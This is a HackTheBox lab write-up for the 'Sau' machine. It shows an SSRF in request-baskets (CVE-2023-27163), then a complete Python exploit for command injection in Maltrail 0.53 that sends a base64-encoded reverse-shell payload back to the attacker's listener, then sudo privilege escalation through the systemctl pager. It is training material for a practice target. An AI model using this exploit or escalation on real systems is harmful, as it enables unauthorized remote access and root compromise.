---
title: "HackTheBox: Sau"
date: 2023-10-19
author: "CHW"
tags:
  - hackthebox
description: "Lab HackTheBox: https://app.hackthebox.com/machines/Sau Initial Enumeration ..."
---

HackTheBox: Sau
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/machines/Sau

### Initial Enumeration

●Start Machine: 
![](https://hackmd.io/_uploads/B1eirO-xT.png)



## Solution

### 1. nmap scan
> nmap -sC -sV -T4 10.10.11.224

![](https://hackmd.io/_uploads/rk1OKqfga.png)

### 2. Browse http://10.10.11.224:55555/web
![](https://hackmd.io/_uploads/rJp-WGOgp.png)

### 3. Create a new basket
> http://10.10.11.224:55555/web/chwtest

![](https://hackmd.io/_uploads/Syehubf_ga.png)

### 4. Curl http://10.10.11.224:55555/web/chwtest
![](https://hackmd.io/_uploads/SJVlNfde6.png)

### 5.Attempt bucket response
![](https://hackmd.io/_uploads/S15biNug6.png)

#### 5.1 Curl http://10.10.11.224:55555/web/chwtest
![](https://hackmd.io/_uploads/SyPBjN_lp.png)

### 6. CVE 2023-27163
● [NATIONAL VULNERABILITY DATABASE](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

#### 6.1 Attepmt curl
> curl --location 'http://10.10.11.224:55555/api/baskets/chwtest2' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'

![](https://hackmd.io/_uploads/BJaVcrOea.png)

**(web)**
![](https://hackmd.io/_uploads/ryFU5rOlT.png)
> Powered by Mailtrail (v0.53)
>     ● Hide threat
>     ● Report false positive

### 7. Command Injection
[Unauthenticated OS Command Injection in stamparm/maltrail](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)

#### 7.1 create exploit.py
``` python=
#!/bin/python3

import sys
import os
import base64

# Arguments to be passed
YOUR_IP = sys.argv[1]  # <your ip>
YOUR_PORT = sys.argv[2]  # <your port>
TARGET_URL = sys.argv[3]  # <target url>

print("\n[+]Started MailTrail version 0.53 Exploit")

# Fail-safe for arguments
if len(sys.argv) != 4:
    print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
    sys.exit(-1)


# Exploit the vulnerbility
def exploit(my_ip, my_port, target_url):
    # Defining python3 reverse shell payload
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    # Encoding the payload with base64 encoding
    encoded_payload = base64.b64encode(payload.encode()).decode()
    # curl command that is to be executed on our system to exploit mailtrail
    command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    # Executing it
    os.system(command)


print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
try:
    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
    print("\n[+] Successfully Exploited")
    print("\n[+] Check your Reverse Shell Listener")
except:
    print("\n[!] An Error has occured. Try again!")
```
#### 7.2 Create ncat listening 
> ncat -nvlp

![](https://hackmd.io/_uploads/r1gxZp5lp.png)


#### 7.3 Execution exploit.py

> python3 exploit.py 10.10.14.70 9876 http://10.10.11.224:55555/chwtest2

![](https://hackmd.io/_uploads/HkOSWacgp.png)

(ncat)
![](https://hackmd.io/_uploads/HyrvZ69e6.png)

#### 7.4 Find user flag
> $id
> uid=1001(puma) gid=1001(puma) groups=1001(puma)
> $whami
> puma

![](https://hackmd.io/_uploads/BkujW6qga.png)

> $cd ~
> cd ~
> $ls
> user.txt

![](https://hackmd.io/_uploads/SyksP05e6.png)

### 8. Get User Flag
user flag:
> **108552a4226f9a311***************

### 9. Privilege Escalation
> ls -al

![](https://hackmd.io/_uploads/SJ_kK09g6.png)

> sudo -l

![](https://hackmd.io/_uploads/rJ_-YC9ga.png)

●[less interface](https://gtfobins.github.io/#less)

> sudo systemctl status trail.service
> -(press RETURN)!/bin/sh
> !//bbiinn//sshh!/bin/sh

![](https://hackmd.io/_uploads/rkHVYCql6.png)

#### 9.1 Check privilege & Find root flag
> whoami

![](https://hackmd.io/_uploads/SJvsq0ql6.png)
> $cd ~
> cd ~
> $ls
> go root.txt

![](https://hackmd.io/_uploads/SytCcC5gp.png)
### 10. Get Root Flag
root flag:
> **d87bc7e22d1ea5b307**************


###### tags: `Web` `CTF` `ncat` `Privilege Escalation` `exploit.py`
